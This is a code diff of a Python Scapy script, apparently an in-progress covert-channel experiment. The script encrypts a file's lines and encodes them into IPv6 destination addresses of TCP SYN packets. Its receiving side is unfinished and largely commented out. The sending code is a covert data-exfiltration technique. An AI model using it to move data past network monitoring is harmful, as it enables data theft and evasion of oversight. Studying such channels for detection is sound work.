@@ -94,12 +94,12 @@ def main(argv):
 	else:
 		while 1:
 			f = open(bestand, 'r')
-			for line in f:
+			for msgid, line in enumerate(f):
 				msg = encrypt(key, line)
 				if mode == 1:
 					send_sp(msg, ipv6_dst)
 				elif mode == 2:
-					send_dip6(msg, network)
+					send_dip6(msgid, msg, network)
 				sleep(1)
 			f.close()
 			sleep(10)
@@ -118,13 +118,15 @@ def recieve_sp():
 					print 'Strange sport detected: '+ str(recieved[0].sport)
 
 def recieve_dip6(network):
-	msg = []
+	msg = [['*' for y in range(16)] for x in range(4096)]
+	print "".join(msg[1024])
+
 	while 1:
 		recieved = sniff(filter='net '+ network +'/64', count=1)
 		print recieved[0].dst
-		if recieved[0].dst == '2001::FFF':
-			print 'YOLO!'
-			#return str(msg)
+
+
+#	return str(msg)
 #		else:
 #			try:
 #				msg.append(chr(recieved[0].sport - 10000))
@@ -142,17 +144,26 @@ def send_sp(msg, ipv6_dst):
 	segment = TCP(sport = 30000)
 	send(packet/segment)
 
-def send_dip6(msg, network):
+def send_dip6(msgid, msg, network):
 	segment = TCP(dport=80, flags=0x02)
-	print msg
-	for c in msg:
-		host = '%x' % ord(c)
-		packet = IPv6(dst = network + host)
-		#packet = IPv6(dst = network + 'FFF')
+	print msgid, msg
+	#we use a 2001::/96 32-bit to hide (-2)
+	#12-bit message number, 4-bit for sequence number (always 16 because of AES)
+	teller = 0
+	for seq in range(16):
+		host = []
+		host.append('%x' % msgid)
+		host.append('%x' % seq)
+		host.append(':')
+
+		for i in range(2):
+			host.append('%x' % ord(msg[teller]))
+			teller = teller + 1
+		print "".join(host)
+		packet = IPv6(dst = network + "".join(host))
 		send(packet/segment)
 		sleep(1)
-	packet = IPv6(dst = network + 'FFF')
-	send(packet/segment)
+
 
 def encrypt(key, clear):
 	BLOCK_SIZE = 32
